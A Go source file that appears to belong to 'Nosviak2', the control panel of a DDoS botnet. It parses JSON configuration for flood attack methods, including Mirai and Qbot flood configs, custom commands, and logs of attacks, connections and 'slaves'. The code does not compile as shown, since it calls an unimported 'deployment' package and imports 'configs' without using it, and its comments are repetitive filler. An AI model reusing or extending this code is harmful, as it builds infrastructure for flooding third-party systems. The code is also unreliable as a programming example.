package json

import (
	"Nosviak2/core/configs"
	"Nosviak2/core/configs/models"
	"encoding/json"
)

var ConfigSettings *models.ConfigurationJson = nil
var AttacksJson map[string]*models.Method
var MiraiAttacksJson map[string]*models.MiraiMethod
var QbotAttacksJson map[string]*models.QbotMethod
var CustomCommands map[string]*models.CustomCommand
var Suggestions models.SuggestionMethod
var GradientColour map[string]*models.GradientBodys

//stores all the valid objects properly
//any object inside here will be parsed without issues
var Objects map[string]func(file string, value string) error = map[string]func(file string, value string) error{
	//stores the configuration element properly
	//this will allow for proper handling without issues
	"assets"+deployment.Runtime()+"config.json": func(file, value string) error {
		var t models.ConfigurationJson
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := json.Unmarshal([]byte(value), &t); err != nil {
			return err //returns the error correctly
		}

		//sets the structure properly
		//allows for better handling without issues
		ConfigSettings = &t //sets the model
		return nil
	},

	"assets"+deployment.Runtime()+"attacks"+deployment.Runtime()+"apis.json" : func(file, value string) error {
		//resets the map properly
		//ensures its refilled properly
		AttacksJson = make(map[string]*models.Method)

		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := json.Unmarshal([]byte(value), &AttacksJson); err != nil {
			return err //returns the error correctly
		}
		return nil
	},

	//mirai configuration file properly
	//this will launch via mirai floods properly
	"assets"+deployment.Runtime()+"attacks"+deployment.Runtime()+"mirai.json" : func(file, value string) error {
		//resets the map properly
		//ensures its refilled properly
		MiraiAttacksJson = make(map[string]*models.MiraiMethod)

		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := json.Unmarshal([]byte(value), &MiraiAttacksJson); err != nil {
			return err //returns the error correctly
		}
		return nil
	},
	//qbot configuration file properly
	//this will launch via qbot floods properly
	"assets"+deployment.Runtime()+"attacks"+deployment.Runtime()+"qbot.json" : func(file, value string) error {
		//resets the map properly
		//ensures its refilled properly
		QbotAttacksJson = make(map[string]*models.QbotMethod)

		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := json.Unmarshal([]byte(value), &QbotAttacksJson); err != nil {
			return err //returns the error correctly
		}
		return nil
	},
	"assets"+deployment.Runtime()+"logs"+deployment.Runtime()+"commands.json" : func(file, value string) error {
		return nil
	},
	"assets"+deployment.Runtime()+"logs"+deployment.Runtime()+"connections.json" : func(file, value string) error {
		return nil
	},
	"assets"+deployment.Runtime()+"logs"+deployment.Runtime()+"attacks.json" : func(file, value string) error {
		return nil
	},
	"assets"+deployment.Runtime()+"logs"+deployment.Runtime()+"apis.json" : func(file, value string) error {
		return nil
	},
	"assets"+deployment.Runtime()+"logs"+deployment.Runtime()+"slaves.json" : func(file, value string) error {
		return nil
	},

	"assets"+deployment.Runtime()+"commands.json": func(file, value string) error {
		//resets the map properly
		//ensures its refilled properly
		CustomCommands = make(map[string]*models.CustomCommand)
		
		//this will properly umarshal the value
		//allows for proper handling without issues
		if err := json.Unmarshal([]byte(value), &CustomCommands); err != nil {
			return err //returns the error correctly
		}
		return nil
	},

	"assets"+deployment.Runtime()+"attacks"+deployment.Runtime()+"suggestion.json" : func(file, value string) error {
		return json.Unmarshal([]byte(value), &Suggestions)
	},

	"assets"+deployment.Runtime()+"gradient.json":func(file, value string) error {
		return json.Unmarshal([]byte(value), &GradientColour)
	},
}